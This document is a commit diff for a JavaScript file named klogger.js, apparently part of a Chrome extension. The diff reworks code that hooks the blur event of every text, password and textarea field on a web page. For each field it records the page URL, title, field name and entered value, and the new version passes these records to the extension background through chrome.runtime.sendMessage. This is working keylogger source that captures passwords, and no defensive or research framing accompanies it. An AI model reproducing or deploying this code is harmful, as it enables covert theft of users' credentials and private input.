564732be940555840b00f263592a0fc2c1727718
bigmeech <denachural@gmail.com>
2014-03-24 06:17:09 +0000

    Fixed some issues with saving logs

--- js/klogger.js
+++ js/klogger.js
@@ -1,79 +1,61 @@
-    //set up local database
-    //isSupported = "indexedDB" in window
-    var db = null;
-    var store
-    if("indexedDB" in window)
-    {
-        var openReq = indexedDB.open("kloggerBase",2,function(){
-            alert("database Opened");
-        });
-        openReq.onupgradeneeded = function(e){
-            console.log("upgrading db...");
-            var newDb = e.target.result;
-            if(!newDb.objectStoreNames.contains("inputLogs")){
-                newDb.createObjectStore("inputLogs");
-            }
-        }
+(function($){
+  KLOGGER={}
 
-        openReq.onsuccess = function(e){
-            console.log("db was opened successfully");
-            db = e.target.result;
-            setTimeout(function(){
-                try
-                {
-                    store = db.transaction(["inputLogs"],"readWrite");
-                }
-                catch(e){
-                    console.log(e);
-                }
+  //initialises stuff, also attaches events to every textboxe's unb
+  KLOGGER.init=function(){
+    var isSupported = "localStorage" in window,
+        error = {},
+        store = null,
+        log = {}
 
-            },3000)
-
-        }
-
-        openReq.onerror = function(e)
-        {
-            console.log(e);
-        }
-    }
-
-    //log object to hold data
-    var log={
-        link:null,
-        pageTitle:null,
-        inputName:null,
-        data:null,
-        date:null
-    }
-
-    //attach listeners to textareas and input fields suchs as password and textboxes
-    var allInputs = $("[type=text],[type=password],textarea");
-    allInputs.each(function()
-    {
+    if(isSupported){
+      KLOGGER.logPort = chrome.runtime.connect({name:"klogger"})
+      var allInputs = $("[type=text],[type=password],textarea");
+      allInputs.each(function()
+      {
         var el=$(this)
         var originalFn =el.blur;
 
         el.blur(function(){
-            log.link = window.location.href;
-            log.pageTitle = $('title').text();
-            log.inputName = this.name;
-            log.data= this.value;
-            log.date = new Date().toDateString();
-            if(log.data !== ""){
-                storeLog(log);
-            }
-            el.blur = originalFn;
-            //el.trigger('blur');
+          log.link = window.location.href;
+          log.pageTitle = $('title').text();
+          log.inputName = this.name;
+          log.data= this.value;
+          log.date = new Date().getTime();
+          if(log.data !== ""){
+            KLOGGER.addLog(log);
+          }
+          el.blur = originalFn;
+          //el.trigger('blur');
         })
-    });
-
-    //initialise and create datastore
-    function storeLog(log){
-        var storeReq = store.add(log);
-        storeReq.onerror =function(e){
-            console.log("Error",e.target.error.name)
-        }
-        storeReq.onsuccess= function(e){
-            console.log("New Input log added");
-        }
+      });
     }
+    else{
+      error.message = "Local Storage not supported"
+    }
+  }
+
+  //save just one log
+  KLOGGER.addLog=function(log){
+    var message = {
+      type:"addLog",
+      data:log
+    }
+    chrome.runtime.sendMessage(message,function(msg){
+      console.log(msg);
+    });
+  }
+
+  //get all logs
+  KLOGGER.getLogs=function(){
+    var message = {
+      type:"getAll",
+      data:null
+    }
+    chrome.runtime.sendMessage(message,function(msg){
+      console.log(msg);
+    });
+  }
+
+  KLOGGER.init();
+})(jQuery,undefined)
